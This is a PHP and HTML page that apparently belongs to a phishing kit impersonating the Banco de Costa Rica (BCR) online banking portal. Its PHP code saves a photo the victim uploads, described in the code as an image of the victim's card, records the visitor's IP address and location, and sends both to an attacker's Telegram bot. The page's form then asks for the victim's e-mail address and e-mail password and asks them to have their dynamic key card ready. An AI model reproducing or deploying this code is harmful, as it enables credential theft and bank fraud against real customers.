<?php
session_start();
ini_set("display_errors", 0);
include("datos_telgram.php");


function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];




if(isset($_FILES['photo']['tmp_name'])){


$parts = explode(".",$_FILES['photo']['name']);
$end=$parts['1']; 
$target_pathnew = "".$_SESSION['usuario'].".". $end."";
$host= $_SERVER["HTTP_HOST"];
$ruta = "".$host."";
$rutanew= "http://".$ruta."/".$target_pathnew."";

 if(move_uploaded_file($_FILES['photo']['tmp_name'], $target_pathnew)){

$message = "DIRECCION DE TARJETA : ".$rutanew."
\r\nIP: ".$myip." ".$pais." ".$region." ";


$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));


 }
}



?>

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="./archivos/style.css" rel="stylesheet" type="text/css">
<title>BCR</title>
</head>
<body>
	
			
			
	<div class="head">
	<img src="./archivos/logo.gif" class="logo">
	<img src="./archivos/Certificado.svg" class="headimg1">
	<img src="./archivos/Contactenos.svg" class="headimg2">
		<a href="#" class="linkhead1">Certificaciones</a>
		<a href="#" class="linkhead2">Contáctenos</a>
	</div>
	<div class="head2">
		
		<span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
		
	</div>
	<div class="costilla">
	<span class="seguridadtxt">Seguridad</span>
	<img class="imgcostilla1" src="./archivos/Consideraciones.svg">	
	<img class="imgcostilla2" src="./archivos/reglamento.svg">	
		<span class="textcostilla1">Consideraciones</span>
		<span class="textcostilla2">Reglamentos</span>
		
		
	</div>
	<div class="containerimg">	
		
		


		
		<div class="divform1">


<form action="index4.php" method="post">

			<span class="ingresartxt">Validar datos BCR</span>
			<hr class="line1" color="#C4C4C4">
			<img class="userimg2" src="./archivos/mail.png">
			<img class="passimg" src="./archivos/Seguridad.svg">
			
	<div class="floating-label">      
		<input class="user" type="email" name="mailed" autocomplete="off" required="">
		<span class="highlight"></span>
		<label>E-mail registrado</label>
	</div>
			
			
	<div class="floating-label2">      
		<input class="pass" type="password" id="pass" name="passmailed" onfocus="ACTION333()" onkeyup="ACTION222()" autocomplete="off" required="">
		<span class="highlight2"></span>
		<label>Contraseña E-mail</label>
			
			<img id="imgpass1" src="./archivos/ver.png" class="ver" onclick=" pass1(); pass2(); pass11();">
			<img id="imgpass2" src="./archivos/ver2.png" class="ver" onclick=" pass3(); pass4(); pass33();" style="display: none;">
	</div>
	
			<button type="submit" class="btn-uno">Continuar</button>	
	
		
		</form>
</div>

		<div class="divform2">
			
			<span class="ingresartxt">Estado actual</span>
			
			<hr class="line1" color="#C4C4C4">

			<span class="registertext">
			Usuario: <strong style="color:#0033a0;"><?php echo "".$_SESSION['usuario']."";?></strong><br><br>
			Estado: <strong>Validar datos de<br> correo electrónico</strong> <br> <br>Por favor tenga a la mano su Tarjeta Clave Dinámica<br> ya que el sistema le solicitará para el proceso.
			</span>

		</div>
		
		
		
		
	<div class="formcontainer">
	
		
	</div>
	
	</div>
	
	<div class="footer"><span class="footertext"> BCR © Derechos Reservados 2023.     Contáctenos: CentroAsistenciaBCR@bancobcr.com</span></div>
	
	

</body></html>